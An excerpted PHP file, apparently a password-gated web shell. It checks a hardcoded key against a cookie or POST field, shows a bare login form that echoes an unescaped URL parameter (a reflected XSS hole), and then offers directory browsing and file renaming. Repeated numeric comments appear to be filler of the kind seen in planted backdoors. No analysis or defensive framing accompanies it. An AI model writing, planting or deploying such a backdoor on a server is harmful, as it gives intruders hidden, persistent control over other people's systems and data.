...
$auth_key = "599f2a84d5c6a0bb4d35410a7d6412c2";
...
$pass = false;
if (isset($_COOKIE['pw_name_66837'])) {
    if(($_COOKIE['pw_name_66837']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_66837'])) {
        if(($_POST['pw_name_66837']) == $auth_key) {
            setcookie("pw_name_66837", $_POST['pw_name_66837']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_66837' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682774224813 1724682774602019 1724682774928095 1724682774575428
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682774224813 1724682774602019 1724682774928095 1724682774575428
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682774224813 1724682774602019 1724682774928095 1724682774575428
            $name = PATH . "/" . $_GET['r'];
